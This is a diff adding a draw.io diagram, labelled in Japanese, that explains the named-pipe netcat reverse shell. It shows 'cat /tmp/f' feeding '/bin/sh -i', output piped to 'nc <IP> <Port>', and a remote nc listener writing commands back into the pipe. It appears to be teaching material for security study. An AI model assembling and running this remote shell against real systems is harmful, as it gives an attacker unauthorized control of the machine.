@@ -1,0 +1,65 @@
+<mxfile host="Electron">
+  <diagram name="ページ-1" id="kO3iEbL6wm5juA1YhWYc">
+    <mxGraphModel dx="1426" dy="1402" grid="0" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+      <root>
+        <mxCell id="0" />
+        <mxCell id="1" parent="0" />
+        <mxCell id="EiJq6z_-djYDWagO31nH-7" edge="1" parent="1" source="EiJq6z_-djYDWagO31nH-10" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;fontSize=14;strokeColor=#0000FF;">
+          <mxGeometry relative="1" as="geometry">
+            <mxPoint x="378.0000000000001" y="440" as="sourcePoint" />
+            <mxPoint x="895.84" y="450" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-8" edge="1" parent="1" source="EiJq6z_-djYDWagO31nH-9" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=1;entryY=0.5;entryDx=0;entryDy=0;exitX=0;exitY=0.75;exitDx=0;exitDy=0;fontSize=14;strokeColor=#FF0000;edgeStyle=orthogonalEdgeStyle;" target="EiJq6z_-djYDWagO31nH-12">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="539" y="470" />
+              <mxPoint x="539" y="607" />
+            </Array>
+            <mxPoint x="896.08" y="460" as="sourcePoint" />
+            <mxPoint x="378" y="460" as="targetPoint" />
+          </mxGeometry>
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-5" parent="1" style="ellipse;shape=cloud;whiteSpace=wrap;html=1;strokeColor=light-dark(#000000,#000000);fontSize=14;" value="ネットワーク" vertex="1">
+          <mxGeometry height="113" width="173" x="629" y="401" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-9" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fontSize=14;" value="nc リスナー" vertex="1">
+          <mxGeometry height="80" width="120" x="898" y="410" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-10" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fontSize=14;" value="nc&amp;nbsp;&lt;div&gt;&amp;lt;IP Addrf&amp;gt; &amp;lt;Port&amp;gt;&lt;/div&gt;" vertex="1">
+          <mxGeometry height="80" width="120" x="489" y="410" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-14" edge="1" parent="1" source="EiJq6z_-djYDWagO31nH-12" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=1;entryDx=0;entryDy=0;fontSize=14;strokeColor=#FF0000;" target="EiJq6z_-djYDWagO31nH-13">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-12" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fontSize=14;" value="cat /tmp/f" vertex="1">
+          <mxGeometry height="80" width="120" x="165" y="567" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-15" edge="1" parent="1" source="EiJq6z_-djYDWagO31nH-13" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=14;strokeColor=#0000FF;" target="EiJq6z_-djYDWagO31nH-10">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-13" parent="1" style="rounded=1;whiteSpace=wrap;html=1;fontSize=14;" value="/bin/sh -i" vertex="1">
+          <mxGeometry height="80" width="120" x="165" y="410" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-16" parent="1" style="text;html=1;whiteSpace=wrap;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;rounded=0;fontColor=light-dark(#ff0000, #ededed);fontStyle=1" value="実行したいコマンド" vertex="1">
+          <mxGeometry height="32" width="120" x="786" y="493" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-17" parent="1" style="text;html=1;whiteSpace=wrap;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;rounded=0;fontColor=light-dark(#0000ff, #ededed);" value="&lt;b&gt;コマンドの実行結果&lt;/b&gt;" vertex="1">
+          <mxGeometry height="32" width="120" x="786" y="369" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-2" parent="1" style="shape=cylinder3;whiteSpace=wrap;html=1;boundedLbl=1;backgroundOutline=1;size=15;rotation=0;direction=north;fontSize=14;" value="名前付きパイプ&lt;div&gt;/tmp/f&lt;/div&gt;" vertex="1">
+          <mxGeometry height="110" width="140" x="333" y="547" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-21" parent="1" style="text;html=1;whiteSpace=wrap;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;rounded=0;fontColor=light-dark(#ff0000, #ededed);fontStyle=1" value="&lt;div&gt;&lt;span style=&quot;background-color: transparent; color: light-dark(rgb(255, 0, 0), rgb(237, 237, 237));&quot;&gt;/tmp/fに書き込まれた&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;background-color: transparent; color: light-dark(rgb(255, 0, 0), rgb(237, 237, 237));&quot;&gt;文字列（&lt;/span&gt;&lt;span style=&quot;background-color: transparent; color: light-dark(rgb(255, 0, 0), rgb(237, 237, 237));&quot;&gt;実行したいコマンド&lt;/span&gt;&lt;span style=&quot;background-color: transparent; color: light-dark(rgb(255, 0, 0), rgb(237, 237, 237));&quot;&gt;）を標準入力に渡す&lt;/span&gt;&lt;/div&gt;" vertex="1">
+          <mxGeometry height="40" width="140" x="46" y="509" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-22" parent="1" style="text;html=1;whiteSpace=wrap;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;rounded=0;fontColor=light-dark(#0000ff, #ededed);" value="&lt;div&gt;&lt;b&gt;/bin/shの実行結果&lt;/b&gt;&lt;b style=&quot;background-color: transparent; color: light-dark(rgb(0, 0, 255), rgb(237, 237, 237));&quot;&gt;を&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b style=&quot;background-color: transparent; color: light-dark(rgb(0, 0, 255), rgb(237, 237, 237));&quot;&gt;ncの標準入力に渡す&lt;/b&gt;&lt;/div&gt;" vertex="1">
+          <mxGeometry height="32" width="145" x="316" y="380" as="geometry" />
+        </mxCell>
+        <mxCell id="EiJq6z_-djYDWagO31nH-25" parent="1" style="text;html=1;whiteSpace=wrap;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;rounded=0;fontColor=light-dark(#ff0000, #ededed);fontStyle=1" value="&lt;div&gt;ncが受信したデータを/tmp/fに書き込む&lt;/div&gt;&lt;div&gt;（ncのリダイレクト）&lt;/div&gt;" vertex="1">
+          <mxGeometry height="40" width="120" x="551" y="538" as="geometry" />
+        </mxCell>
+      </root>
+    </mxGraphModel>
+  </diagram>
+</mxfile>
